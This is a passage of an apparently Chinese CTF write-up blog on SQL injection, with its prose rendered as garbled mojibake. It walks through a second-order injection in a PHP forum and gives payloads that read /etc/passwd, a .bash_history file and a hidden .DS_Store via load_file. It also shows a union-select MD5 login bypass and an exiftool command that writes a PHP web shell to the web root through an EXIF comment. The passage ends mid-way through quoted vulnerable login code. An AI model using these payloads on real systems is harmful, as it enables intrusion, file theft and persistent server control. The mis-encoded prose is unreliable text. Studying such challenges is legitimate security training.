punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>write</code>æ“ä½œå¯¹åº”å‘å¸–ï¼Œ<code>comment</code>æ“ä½œå¯¹åº”è¯„è®ºæ“ä½œï¼Œä½†æ˜¯åœ¨è¿›è¡Œè¿™äº›æ“ä½œçš„å‰ææ˜¯è¦ç™»å½•ä¸Šï¼Œäºæ˜¯æˆ‘ä»¬çœ‹åˆ°ç™»å½•ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png" alt loading="lazy"></p><p>ä¸¤ä¸ªæç¤ºä¼¼ä¹åœ¨æš—ç¤ºè¿™ä»€ä¹ˆï¼Œäºæ˜¯å¯¹å¯†ç çš„ä¸‰ä¸ª*å‡ºå¤„è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç <code>zhangwei666</code>æˆåŠŸç™»å½•ï¼Œæ¥åˆ°å‘å¸–ç•Œé¢ï¼Œé¦–å…ˆæˆ‘ä»¬çœ‹å‘å¸–æ“ä½œï¼Œç”¨<code>addslashes</code>å‡½æ•°å¯¹å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¯´åˆ°<code>addslashes</code>å¼•å‘çš„å®‰å…¨é—®é¢˜å¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html">https://bbs.ichunqiu.com/thread-10899-1-1.html</a></p><p>é‡Œé¢ä»‹ç»äº†ç»•è¿‡<code>addslashes</code>å‡½æ•°çš„æ–¹æ³•ï¼Œä½†åœ¨è¿™é‡Œä¼¼ä¹ç”¨ä¸åˆ°ï¼Œä»”ç»†è§‚å¯Ÿä»£ç ï¼Œ<code>addslashes</code>å‡½æ•°é™åˆ¶äº†æˆ‘ä»¬å¯¹ä¸€äº›ç‰¹æ®Šç¬¦å·çš„æ“ä½œï¼Œä½¿å¾—sqlè¯­å¥èƒ½å¤Ÿæ­£å¸¸çš„æ‰§è¡Œï¼Œä½†å¹¶æ²¡æœ‰æ”¹å˜æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œæµ‹è¯•å¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°å¹¶ä¸ä¼šæ”¹å˜å­˜å…¥æ•°æ®åº“ä¸­çš„å†…å®¹ï¼ŒæŸ¥è¯¢å‡ºé‡Œé¢çš„ç»“æœä¹Ÿæ˜¯ä¸€æ ·ï¼Œäºæ˜¯æˆ‘ä»¬å†çœ‹åˆ°<code>commit</code>æ“ä½œï¼Œé‡Œé¢çš„<code>mysql_fetch_array</code>å‡½æ•°åœ¨æ•°æ®åº“ä¸­å–å‡º<code>category</code>å­—æ®µä¸­çš„å†…å®¹ï¼Œç„¶åå†ç›´æ¥è¿›è¡Œäº†<code>insert into</code>å­˜å…¥è¯„è®ºæ•°æ®çš„æ“ä½œæ“ä½œä¼ å…¥çš„å‚æ•°<code>category</code>æˆ‘ä»¬å¯ï¼Œåé¢çš„<code>content</code>å‚æ•°æˆ‘ä»¬ä¹Ÿå¯æ§äºæ˜¯å°±å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><p>å…ˆä¼ å…¥<code>category</code>å­—æ®µçš„å€¼ä¸º<code>a&#39;,content=(select user()),/*</code>,å‰é¢çš„å•å¼•å·è™½ç„¶åœ¨å­˜å…¥æ•°æ®åº“çš„è¿‡ç¨‹ä¸­è¢«è½¬ä¹‰äº†ï¼Œä½†æ˜¯æ•°æ®åº“ä¸­åå­˜çš„ä¾æ—§æ˜¯ç”¨æ¥çš„å†…å®¹ï¼Œåé¢çš„å–å‡ºæ¥çš„æ—¶å€™ä¹Ÿä¼šå°†å•å¼•å·åŸå°ä¸åŠ¨çš„å–å‡ºæ¥ï¼Œåœ¨è¿›è¡Œ<code>comment</code>çš„<code>insert into</code>æ“ä½œæ—¶å€™ï¼Œå°±ä¼šé—­åˆå‰é¢çš„å•å¼•å·ï¼Œä»è€Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„ï¼Œç„¶åè·Ÿä¸Šçš„<code>content</code>å€¼å½“ç„¶å°±æ˜¯è¦è¿›è¡Œ<code>sql</code>æ³¨å…¥æŸ¥æ‰¾æ•°æ®çš„æ“ä½œï¼Œç„¶åå†æ¥ä¸Š<code>/*</code>ï¼Œè¿™æ ·æˆ‘ä»¬åé¢å†è¯„è®ºé¡µé¢è¿›è¡Œè¯„è®ºçš„æ—¶å€™ä¼ å…¥<code>*/#</code>å°±èƒ½æˆåŠŸçš„å’Œå‰é¢çš„é—­åˆèµ·æ¥ï¼Œæ€»<code>payload</code>å¦‚ä¸‹ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into comment set category &#x3D; &#39;a&#39;,content&#x3D;(select user()),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png" alt loading="lazy"></p><p>å°è¯•å†™é©¬æ— æœï¼Œåº”è¯¥æ˜¯æƒé™ä¸å¤Ÿï¼Œç„¶åå†ctfæ•°æ®åº“æŸ¥åˆ°ä¸‰ä¸ªè¡¨<code>board,comment,user</code></p><p><code>user</code>è¡¨ä¸­æœ‰å¦‚ä¸‹åˆ—</p><pre class="language-none"><code class="language-none">id,username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string</code></pre><p><code>board</code>è¡¨ä¸­æœ‰å¦‚ä¸‹åˆ—</p><pre class="language-none"><code class="language-none">id,category,title,content</code></pre><p><code>comment</code>è¡¨ä¸­æœ‰å¦‚ä¸‹åˆ—</p><pre class="language-none"><code class="language-none">id,bo_id,category,content</code></pre><p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾åå¹¶æ²¡æœ‰å‘ç°å­˜åœ¨<code>flag</code>çš„å†…å®¹ï¼Œçœ‹æ¥<code>flag</code>å¹¶æ²¡åœ¨æ•°æ®åº“ä¸­ï¼Œä¸åœ¨æ•°æ®åº“ä¸­é‚£åªèƒ½åœ¨æ–‡ä»¶ä¸­äº†ï¼Œäºæ˜¯è¿›è¡Œæ–‡ä»¶è¯»å–æ“ä½œï¼Œæ ¹ç›®å½•ä¸‹å¹¶æ²¡æœ‰<code>flag</code>ï¼Œäºæ˜¯æˆ‘ä»¬å·¦è¯•å³è¯•éƒ½æ²¡å‘ç°<code>flag</code>ï¼Œäºæ˜¯è¯»å–<code>/etc/passwd</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png" alt loading="lazy"></p><p><code>/etc/passwd</code>æ–‡ä»¶æè¿°å‚è€ƒï¼š<a href="http://www.suk1.top/2020/01/13/Linux_etc_passwd/#%E4%B8%BB%E7%9B%AE%E5%BD%95-%E5%92%8C-Shell">Linux passwd æ–‡ä»¶è¯¦è§£</a></p><p>æ³¨æ„åˆ°æœ€åä¸€è¡Œï¼Œ<code>www:x:500:500:www:/home/www:/bin/bash</code>wwwç”¨æˆ·åœ¨<code>/home/www</code>çš„ç›®å½•ä¸‹è¿›è¡Œäº†<code>/bin/bash</code>çš„<code>shell</code>æ“ä½œï¼Œäºæ˜¯æˆ‘ä»¬åˆ©ç”¨<code>.bash_history</code>æŸ¥æ‰¾ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</p><ul><li><code>.bash_history</code>ï¼šä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤,æ–¹ä¾¿æŸ¥æ‰¾ï¼Œå‚è€ƒï¼š<a href="https://blog.csdn.net/caolaosanahnu/article/details/7601074">linuxä¸­Shellå†å²å‘½ä»¤è®°å½•æ–‡ä»¶çš„è·¯å¾„æ˜¯ä»€ä¹ˆ</a></li></ul><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png" alt loading="lazy"></p><p>å¯ä»¥åˆ°è¿›è¡Œäº†å¦‚ä¸Šæ“ä½œï¼Œåˆ‡æ¢åˆ°<code>/tmp</code>ç›®å½•ä¸‹ï¼Œè§£å‹<code>html.zip</code>çš„å‹ç¼©åŒ…ï¼Œåˆ é™¤å‹ç¼©åŒ…ï¼Œå¤åˆ¶<code>html</code>ç›®å½•åŠå…¶å­ç›®å½•åˆ°<code>/var/www/html</code>ç›®å½•ä¸‹ï¼Œç„¶ååˆ é™¤äº†<code>.DS_Store</code>æ–‡ä»¶ï¼Œå¼€å¯<code>Apache</code>æœåŠ¡</p><ul><li><code>.DS_Store</code>ï¼šMac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶</li></ul><p>è¿™ä¸ªè¿‡ç¨‹çœ‹ä¸Šå»æ²¡æ¯›ç—…ï¼Œä½†æ˜¯ä¸­é—´æ¼äº†ä¸€ç‚¹ï¼Œ<code>/tmp</code>ç›®å½•ä¸‹äº†<code>html</code>æ–‡ä»¶å¤¹ä¸­çš„<code>.DS_Store</code>æ–‡ä»¶å¹¶æ²¡ç”¨è¢«åˆ é™¤ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œç›´æ¥è¯»å–åœ¨é¡µé¢ä¸Šå›æ˜¾å¹¶ä¸å®Œå…¨</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png" alt loading="lazy"></p><p>äºæ˜¯é€šè¿‡<code>hex</code>æ–¹å¼è¿›è¡Œè¯»å–</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</code></pre><p>å¾—åˆ°ä¸€é•¿ä¸²åå…­è¿›åˆ¶æ•°å­—ï¼Œæ”¾åˆ°ç½‘ç«™ä¸Šè½¬æ–‡æœ¬</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°åº”è¯¥å­˜æ”¾<code>flag</code>çš„æ–‡ä»¶ï¼Œè¿›è¡Œè¯»å–</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png" alt loading="lazy"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqli"><a href="#å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqli" class="headerlink" title="å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqli"></a>å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqli</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“MD5ç»•è¿‡</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt loading="lazy"></p><p>é¢˜ç›®ç»™å‡ºçš„æç¤ºï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt loading="lazy"></p><p>éšä¾¿ç™»å½•ååœ¨å‰ç«¯HTMLä¸­éƒ½èƒ½çœ‹åˆ°è¿™æ ·ä¸€ä¸²å­—æ¯</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></code></pre><p>base32è§£ç åå¾—åˆ°</p><pre class="language-none"><code class="language-none">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</code></pre><p>base64è§£ç åå¾—åˆ°</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'$name'</span></code></pre><p>sqlmapæµ‹è¯•åå¯ä»¥å¾—åˆ°adminçš„å¯†ç MD5å€¼ï¼Œæ‰¾ä¸åˆ°åŸç </p><p>äºæ˜¯å‚è€ƒMD5ç»•è¿‡ï¼Œå‚è€ƒï¼š<a href="https://www.gem-love.com/websecurity/453.html">ç®€æGXY_CTF â€œBabySqli v1.0â€³ç»•è¿‡md5æ¯”è¾ƒ</a></p><p>åˆ©ç”¨ä»¥ä¸‹æ³¨å…¥è¯­å¥</p><pre class="language-sql" data-language="sql"><code class="language-sql">name: admin<span class="token string">' And 1>2 union select '</span><span class="token number">1</span><span class="token string">','</span>admin<span class="token string">','</span>c4ca4238a0b923820dcc509a6f75849bpw: <span class="token number">1</span></code></pre><p>æ³¨ï¼š</p><ul><li>æ ¹æ®å¾—åˆ°çš„sqlåå°æŸ¥è¯¢è¯­å¥ï¼Œéœ€è¦ç”¨å•å¼•å·é—­åˆï¼Œæ•…æœ€åä¸ç”¨åŠ å•å¼•å·</li><li>union selectåçš„æŸ¥è¯¢å½“å­—ç¬¦ä¸²ä½¿ç”¨éœ€è¦åŠ å•å¼•å·ï¼Œå½“ç„¶æ•°å­—å¯ä»¥ä¸åŠ å•å¼•å·</li><li>è¿‡æ»¤äº†andå¯ä»¥ç”¨å¤§å†™Andç»•è¿‡</li><li>1 çš„MD5å€¼ä¸ºc4ca4238a0b923820dcc509a6f75849b</li></ul><p>äºæ˜¯å½“å‰é¢çš„è¯­å¥And 1&gt;2æ°¸ä¸æˆç«‹ï¼Œè”åˆæŸ¥è¯¢åé¢çš„è¯­å¥å°±ä¼šåœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢æ˜¾ç¤ºå‡ºæ¥</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" loading="lazy"><p>äºæ˜¯è¿™æ—¶è¾“å…¥password=1å³å¯ç»•è¿‡æŸ¥è¯¢å¾—åˆ°flag</p><h3 id="36Dâ€”WEB-ä½ æ²¡è§è¿‡çš„æ³¨å…¥"><a href="#36Dâ€”WEB-ä½ æ²¡è§è¿‡çš„æ³¨å…¥" class="headerlink" title="36Dâ€”WEB_ä½ æ²¡è§è¿‡çš„æ³¨å…¥"></a>36Dâ€”WEB_ä½ æ²¡è§è¿‡çš„æ³¨å…¥</h3><p>åœ¨<code>robots.txt</code>æ‹¿åˆ°å¯ä»¥ç›´æ¥é‡ç½®ç®¡ç†å‘˜å¯†ç çš„ç•Œé¢<code>pwdreset.php</code>ï¼Œç„¶åå†ä»å‰å°ç™»å½•è¿›å»ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢<code>main.php</code>ï¼Œ ç•Œé¢æ²¡æœ‰åšä»€ä¹ˆä¸Šä¼ é™åˆ¶ï¼Œä½†æ˜¯åœ¨ä¸Šä¼ ä¸Šå»ä¹‹åä¼šè·³è½¬åˆ°æ˜¾ç¤ºæ–‡ä»¶åˆ—è¡¨çš„ç•Œé¢<code>filelist.php</code>ï¼Œåå°å°†æ–‡ä»¶åå’Œåç¼€éƒ½æ”¹äº†ï¼Œæ–‡ä»¶ååº”è¯¥æ˜¯md5åŠ ç›åå¾—åˆ°çš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œåç¼€ä¸ºzipæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥å°†æ–‡ä»¶ç›´æ¥ä¸‹è½½ä¸‹æ¥ï¼Œä¸‹è½½ä¸‹æ¥åå‹ç¼©åŒ…æ‰“ä¸å¼€ï¼Œç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€åé‡Œé¢çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸Šå»æ–‡ä»¶çš„å†…å®¹ï¼Œåå°å°†å…¶çš„åå­—å’Œåç¼€éƒ½æ”¹äº†ï¼Œæµ‹è¯•ç»•è¿‡ï¼Œæ— æœ</p><p>å‚è€ƒï¼š<a href="https://www.gem-love.com/ctf/2283.html#ä½ æ²¡è§è¿‡çš„æ³¨å…¥">ä½ æ²¡è§è¿‡çš„æ³¨å…¥</a></p><p>å†çœ‹åˆ°æ–‡ä»¶åˆ—è¡¨æ˜¾ç¤ºçš„ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt loading="lazy"></p><p>é™¤äº†æ–‡ä»¶åä¹‹å¤–åé¢è¿˜æœ‰ä¸€ä¸²ç±»ä¼¼æ–‡ä»¶æ ¼å¼ä¸€æ ·çš„ä¸œè¥¿ï¼Œè¯¦è§ä¸Šé¢å¤§ä½¬çš„åšå®¢å§ï¼Œè¿™é‡Œç»™å‡ºè§£é¢˜æ­¥éª¤ï¼š</p><p>è¿™é‡Œè€ƒçš„æ˜¯<code>EXIF</code>ä¿¡æ¯ä¸­<code>comment</code>å­—æ®µæ³¨å…¥ï¼Œè¿™ä¸ªå­—æ®µä¼šå­˜å…¥æ•°æ®åº“ï¼Œ<code>finfo-&gt;file()</code>å†åœ¨åé¢è¾“å‡ºè¿™ä¸ªä¿¡æ¯ï¼Œé€ æˆäº†sqlæ³¨å…¥æ¼æ´ï¼Œå…ˆå»ç½‘ä¸Šä¸‹è½½ä¸€ä¸ª<code>exiftool</code>å·¥å…· â€”â€”&gt;  <a href="https://exiftool.org/">https://exiftool.org/</a></p><p>å¯ä»¥ç¼–è¾‘å›¾ç‰‡çš„çš„<code>EXIF</code>ä¿¡æ¯</p><p>payloadï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">./exiftool -overwrite_original -comment<span class="token operator">=</span><span class="token string">"y1ng<span class="token entity" title="\&quot;">\"</span>');select 0x3C3F3D60245F504F53545B305D603B into outfile '/var/www/html/1.php';#"</span> <span class="token number">1</span>.jpg</code></pre><p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt loading="lazy"></p><p>ç„¶åç›´æ¥ä¸Šä¼ åˆ°ç½‘ç«™ä¸Šå»å°±å¯ä»¥æ‹¿shelläº†ï¼ˆè¿™é‡Œpngå›¾ç‰‡æ— æ•ˆï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt loading="lazy"></p><h3 id="Hack-lu-2017-FlatScience"><a href="#Hack-lu-2017-FlatScience" class="headerlink" title="Hack.lu-2017-FlatScience"></a>Hack.lu-2017-FlatScience</h3><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png" alt loading="lazy"></p><p>è¿™ä¸ªç½‘ç«™æœ‰å¾ˆå¤šçš„<code>pdf</code>æ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œæš‚æ—¶æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢</p><p>è®¿é—®<code>robots.txt</code>å¾—åˆ°<code>login.php</code>å’Œ<code>admin.php</code>ä¸¤ä¸ªç™»å½•ç•Œé¢ï¼Œ<code>admin.php</code>æºç å­˜åœ¨<code>hintï¼šdo not even try to bypass this</code>ï¼Œ<code>login.php</code>æºç ä¹Ÿå­˜åœ¨<code>TODO: Remove ?debug-Parameter!</code>ï¼Œäºæ˜¯è®¿é—®<code>/login.php?debug</code>å¾—åˆ°<code>login.php</code>çš„æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>..................(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'usr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'usr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../fancy.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT id,name from Users where name='"</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password='"</span><span class="token operator">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token string double-quoted-string">"Salz!"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>Some Error occourred!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token 